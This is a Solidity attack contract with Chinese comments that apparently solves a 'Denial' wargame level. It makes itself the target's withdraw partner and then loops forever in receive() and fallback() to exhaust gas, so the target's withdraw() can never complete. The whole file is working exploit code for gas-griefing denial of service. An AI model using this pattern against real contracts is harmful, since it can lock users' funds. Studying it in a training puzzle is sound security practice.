// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract AttackDenial {
    // 目標 Denial 合約
    IDenial public target;
    
    constructor(address _target) {
        target = IDenial(_target);
    }
    
    // 設置自己為 partner
    function attack() external {
        target.setWithdrawPartner(address(this));
    }
    
    // 在接收以太幣時消耗所有 gas
    receive() external payable {
        // 使用無限循環來消耗所有 gas
        // 這將阻止 Denial 合約的 withdraw() 函數完成執行
        while(true) {
            // 消耗 gas 但不做任何有意義的操作
        }
    }
    
    // 備用接收函數，以防止 receive 沒有被觸發
    fallback() external payable {
        // 同樣使用無限循環消耗所有 gas
        while(true) {}
    }
} 